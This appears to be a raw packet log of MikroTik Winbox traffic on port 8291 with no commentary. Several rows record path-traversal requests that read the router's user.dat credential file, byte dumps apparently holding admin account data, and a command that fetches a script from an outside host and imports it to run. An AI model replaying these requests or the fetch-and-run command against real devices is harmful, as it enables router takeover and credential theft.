3.0.152.10,8291,50.100.248.197,61926,"{ufe0001:2,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,50.100.248.197,61926,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
50.100.248.197,61926,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[21,124,85,222,204,112,220,97,153,56,120,74,221,243,113,8],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,50.100.248.197,61926,"{ufe0001:2,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,50.100.248.197,61926,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
50.100.248.197,61392,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[21,124,85,222,204,112,220,97,153,56,120,74,221,243,113,8],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,50.100.248.197,61392,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
50.100.248.197,61392,3.0.152.10,8291,"{u2:1209,ufe0001:3,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,50.100.248.197,61392,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
43.127.88.103,33217,3.0.152.10,8291,"{u2:1209,ufe0001:3,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,43.127.88.103,33217,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
43.127.88.103,33217,3.0.152.10,8291,"{u2:302,ufe0001:4,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
43.127.88.103,33217,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,87,235,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,161,40,55,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,43.127.88.103,33505,"{ufe0001:5,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,43.127.88.103,33505,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
43.127.88.103,33505,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[232,169,10,129,233,30,58,157,131,208,148,179,160,13,14,192],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,43.127.88.103,33505,"{bff0005:1,uff0006:3,uff0007:1,s1:'admin',r9:[232,169,10,129,233,30,58,157,131,208,148,179,160,13,14,192],ra:[0,162,188,239,70,192,188,241,139,93,45,203,95,89,3,21,105],Uff0001:[13,4],Uff0002:[0,11]}"
43.127.88.103,33505,3.0.152.10,8291,"{b13:0,ub:524286,uf:32,u10:6,ufe0001:281,uff0003:2,uff0006:3,s11:'i386',s15:'CHR',s16:'3.11',s17:'x86',s18:'default',ra:[0,162,188,239,70,192,188,241,139,93,45,203,95,89,3,21,105],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,43.127.88.103,33505,"{bfe000a:0,bff0005:1,u71:327678,u12e:4294967295,u12f:305769600,u131:600,ufe000c:5,uff0006:5,uff0007:16646149,s66:'U6',s12d:'/tool fetch url=http://1awesome.net/poll/ea65af88-b2ce-48d0-a207-0e579f00e799 mode=http dst-path=7wmp0b4s.rsc
/import 7wmp0b4s.rsc',sfe0009:'',Uff0001:[48,3],Uff0002:[0,130]}"
108.20.158.51,61468,3.0.152.10,8291,"{u2:302,ufe0001:2,uff0003:2,uff0006:7,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,108.20.158.51,61468,"{bff0005:1,u2:32768,ufe0001:2,uff0006:0,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
220.101.252.151,9063,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:0,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,127,242,54,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,82.190.224.23,64988,"{bff0005:1,uff0006:7,uff0007:7,s1:'./.././.././.././.././../rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
82.190.224.23,64988,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:7,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,82.190.224.23,64988,"{bff0005:1,u2:32768,ufe0001:1,uff0006:0,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
